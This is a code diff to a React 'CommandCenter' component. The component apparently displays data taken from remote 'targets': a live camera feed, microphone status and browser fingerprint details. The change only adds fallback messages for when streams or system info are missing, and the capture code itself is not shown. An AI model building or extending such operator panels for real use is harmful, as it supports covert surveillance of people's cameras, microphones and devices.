@@ -408,18 +408,27 @@ export function CommandCenter({ onExit, onViewData }: CommandCenterProps) {
                         <Camera className="w-4 h-4 mr-2" />
                         Live Camera Feed
                       </h4>
-                      <div className="bg-black rounded aspect-video flex items-center justify-center">
-                        <video 
-                          ref={(video) => {
-                            if (video && targetData.camera) {
-                              video.srcObject = targetData.camera;
-                            }
-                          }}
-                          autoPlay 
-                          muted 
-                          className="w-full h-full object-cover rounded"
-                        />
-                      </div>
+                      {targetData.camera instanceof MediaStream ? (
+                        <div className="bg-black rounded aspect-video flex items-center justify-center">
+                          <video 
+                            ref={(video) => {
+                              if (video && targetData.camera) {
+                                video.srcObject = targetData.camera;
+                              }
+                            }}
+                            autoPlay 
+                            muted 
+                            className="w-full h-full object-cover rounded"
+                          />
+                        </div>
+                      ) : (
+                        <div className="bg-black rounded aspect-video flex items-center justify-center min-h-[180px]">
+                          <span className="text-slate-400 text-center">Camera stream not available. Only metadata received.</span>
+                          {targetData.camera?.tracks && (
+                            <pre className="text-xs text-slate-300 mt-2 w-full overflow-x-auto">{JSON.stringify(targetData.camera, null, 2)}</pre>
+                          )}
+                        </div>
+                      )}
                     </div>
                   )}
 
@@ -430,10 +439,19 @@ export function CommandCenter({ onExit, onViewData }: CommandCenterProps) {
                         <Mic className="w-4 h-4 mr-2" />
                         Microphone Access
                       </h4>
-                      <div className="flex items-center space-x-4">
-                        <div className="w-4 h-4 bg-green-400 rounded-full animate-pulse"></div>
-                        <span className="text-green-400 text-sm">Audio stream active</span>
-                      </div>
+                      {targetData.microphone instanceof MediaStream ? (
+                        <div className="flex items-center space-x-4">
+                          <div className="w-4 h-4 bg-green-400 rounded-full animate-pulse"></div>
+                          <span className="text-green-400 text-sm">Audio stream active</span>
+                        </div>
+                      ) : (
+                        <div className="flex flex-col items-start space-y-2">
+                          <span className="text-slate-400">Microphone stream not available. Only metadata received.</span>
+                          {targetData.microphone?.tracks && (
+                            <pre className="text-xs text-slate-300 mt-2 w-full overflow-x-auto">{JSON.stringify(targetData.microphone, null, 2)}</pre>
+                          )}
+                        </div>
+                      )}
                     </div>
                   )}
 
@@ -477,7 +495,7 @@ export function CommandCenter({ onExit, onViewData }: CommandCenterProps) {
         </div>
 
         {/* System Information */}
-        {selectedClient && targetData.systemInfo && (
+        {selectedClient && (
           <div className="mt-6">
             <Card className="bg-slate-800 border-slate-600">
               <CardHeader>
@@ -487,36 +505,38 @@ export function CommandCenter({ onExit, onViewData }: CommandCenterProps) {
                 </CardTitle>
               </CardHeader>
               <CardContent>
-                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
-                  <div className="bg-slate-900 rounded-lg p-4">
-                    <h4 className="text-green-400 font-medium mb-2">Browser Details</h4>
-                    <div className="space-y-1 text-sm">
-                      <p><span className="text-slate-400">User Agent:</span></p>
-                      <p className="text-slate-300 text-xs break-all">{targetData.systemInfo.userAgent}</p>
-                      <p><span className="text-slate-400">Platform:</span> {targetData.systemInfo.platform}</p>
-                      <p><span className="text-slate-400">Language:</span> {targetData.systemInfo.language}</p>
+                {targetData.systemInfo ? (
+                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                    <div className="bg-slate-900 rounded-lg p-4">
+                      <h4 className="text-green-400 font-medium mb-2">Browser Details</h4>
+                      <div className="space-y-1 text-sm">
+                        <p><span className="text-slate-400">User Agent:</span></p>
+                        <p className="text-slate-300 text-xs break-all">{targetData.systemInfo.userAgent}</p>
+                        <p><span className="text-slate-400">Platform:</span> {targetData.systemInfo.platform}</p>
+                        <p><span className="text-slate-400">Language:</span> {targetData.systemInfo.language}</p>
+                      </div>
+                    </div>
+                    <div className="bg-slate-900 rounded-lg p-4">
+                      <h4 className="text-green-400 font-medium mb-2">Display Information</h4>
+                      <div className="space-y-1 text-sm">
+                        <p><span className="text-slate-400">Screen Resolution:</span> {targetData.systemInfo.screenWidth}x{targetData.systemInfo.screenHeight}</p>
+                        <p><span className="text-slate-400">Color Depth:</span> {targetData.systemInfo.colorDepth}-bit</p>
+                        <p><span className="text-slate-400">Timezone:</span> {targetData.systemInfo.timezone}</p>
+                      </div>
+                    </div>
+                    <div className="bg-slate-900 rounded-lg p-4">
+                      <h4 className="text-green-400 font-medium mb-2">Capabilities</h4>
+                      <div className="space-y-1 text-sm">
+                        <p><span className="text-slate-400">HTTPS:</span> {targetData.systemInfo.isHttps ? 'Yes' : 'No'}</p>
+                        <p><span className="text-slate-400">Cookies:</span> {targetData.systemInfo.cookieEnabled ? 'Enabled' : 'Disabled'}</p>
+                        <p><span className="text-slate-400">Online:</span> {targetData.systemInfo.onLine ? 'Yes' : 'No'}</p>
+                        <p><span className="text-slate-400">WebRTC:</span> {targetData.systemInfo.webRTC ? 'Available' : 'Not Available'}</p>
+                      </div>
                     </div>
                   </div>
-                  
-                  <div className="bg-slate-900 rounded-lg p-4">
-                    <h4 className="text-green-400 font-medium mb-2">Display Information</h4>
-                    <div className="space-y-1 text-sm">
-                      <p><span className="text-slate-400">Screen Resolution:</span> {targetData.systemInfo.screenWidth}x{targetData.systemInfo.screenHeight}</p>
-                      <p><span className="text-slate-400">Color Depth:</span> {targetData.systemInfo.colorDepth}-bit</p>
-                      <p><span className="text-slate-400">Timezone:</span> {targetData.systemInfo.timezone}</p>
-                    </div>
-                  </div>
-                  
-                  <div className="bg-slate-900 rounded-lg p-4">
-                    <h4 className="text-green-400 font-medium mb-2">Capabilities</h4>
-                    <div className="space-y-1 text-sm">
-                      <p><span className="text-slate-400">HTTPS:</span> {targetData.systemInfo.isHttps ? 'Yes' : 'No'}</p>
-                      <p><span className="text-slate-400">Cookies:</span> {targetData.systemInfo.cookieEnabled ? 'Enabled' : 'Disabled'}</p>
-                      <p><span className="text-slate-400">Online:</span> {targetData.systemInfo.onLine ? 'Yes' : 'No'}</p>
-                      <p><span className="text-slate-400">WebRTC:</span> {targetData.systemInfo.webRTC ? 'Available' : 'Not Available'}</p>
-                    </div>
-                  </div>
-                </div>
+                ) : (
+                  <div className="text-slate-400 text-center py-8">System information not available for this client.</div>
+                )}
               </CardContent>
             </Card>
           </div>
